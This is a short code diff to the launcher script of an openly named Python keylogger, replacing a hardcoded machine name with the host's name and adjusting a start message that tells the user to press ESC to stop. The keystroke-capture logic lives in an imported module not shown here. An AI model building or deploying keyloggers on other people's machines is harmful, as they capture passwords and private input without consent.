@@ -1,10 +1,13 @@
 import time
+import socket
 from KeyLoggerManager import KeyLoggerManager
 
 if __name__ == "__main__":
-    manager = KeyLoggerManager(interval_seconds=10, machine_name="DANIEL2")
+    machine_name = socket.gethostname()
+
+    manager = KeyLoggerManager(interval_seconds=10, machine_name=machine_name)
     manager.start()
-    print("Keylogger started, לחץ ESC לעצירה...")
+    print(f"Keylogger started on {machine_name}, לחץ ESC לעצירה...")
     try:
         while True:
             time.sleep(1)
